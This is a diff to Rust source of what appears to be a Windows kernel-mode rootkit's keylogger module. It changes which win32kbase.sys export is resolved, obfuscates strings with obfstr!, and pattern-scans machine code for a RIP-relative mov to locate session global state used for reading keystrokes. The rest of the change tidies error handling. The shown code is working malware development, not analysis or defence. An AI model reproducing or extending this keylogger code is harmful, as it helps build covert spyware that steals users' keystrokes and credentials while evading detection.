@@ -167,19 +167,18 @@ impl Keylogger {
         // Get the base address of win32kbase.sys.
         let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
         
-        // Retrieve the address of the exported function "W32GetSessionStateForSession".
-        let function_address =
-            get_function_address(obfstr!("W32GetSessionStateForSession"), module_address)?;
+        // Retrieve the address of the exported function "W32GetSessionState".
+        let function_address = get_function_address(obfstr!("W32GetSessionState"), module_address)?;
         
         log::info!(
-            "get_session_globals_address: W32GetSessionStateForSession found at {:p}",
+            "get_session_globals_address: W32GetSessionState found at {:p}",
             function_address
         );
         
         // Define the pattern to search for: the 3-byte opcode for "mov rax, [rip+imm32]"
         let pattern: [u8; 3] = [0x48, 0x8B, 0x05];
         let scan_size = 0x100; // Scan the first 0x100 bytes of the function.
-        let function_bytes = slice::from_raw_parts(function_address as *const u8, scan_size);
+        let function_bytes = core::slice::from_raw_parts(function_address as *const u8, scan_size);
         
         if let Some(pos) = function_bytes.windows(pattern.len()).position(|window| window == pattern) {
             // The instruction is 7 bytes long: 3 bytes opcode + 4 bytes immediate.
@@ -187,14 +186,13 @@ impl Keylogger {
             if imm_offset + 4 > scan_size {
                 return Err(ShadowError::PatternNotFound);
             }
-            // Read the immediate value (the displacement) as a little-endian i32.
-            let imm_bytes = &function_bytes[imm_offset..imm_offset + 4];
-            let displacement = i32::from_le_bytes(imm_bytes.try_into().unwrap()) as isize;
+            let imm_bytes: [u8; 4] = function_bytes[imm_offset..imm_offset + 4]
+                .try_into()
+                .map_err(|_| ShadowError::PatternNotFound)?;
+            let displacement = i32::from_le_bytes(imm_bytes) as isize;
             
-            // The RIP for this instruction is the address after the 7-byte instruction.
-            let rip = (function_address as usize)
-                .wrapping_add(pos)
-                .wrapping_add(7);
+            // The RIP for this instruction is the address immediately after the 7-byte instruction.
+            let rip = (function_address as usize).wrapping_add(pos).wrapping_add(7);
             let target_address = (rip as isize).wrapping_add(displacement) as *mut u8;
             
             log::info!(
@@ -206,4 +204,6 @@ impl Keylogger {
             Err(ShadowError::PatternNotFound)
         }
     }
+    
+    
 }
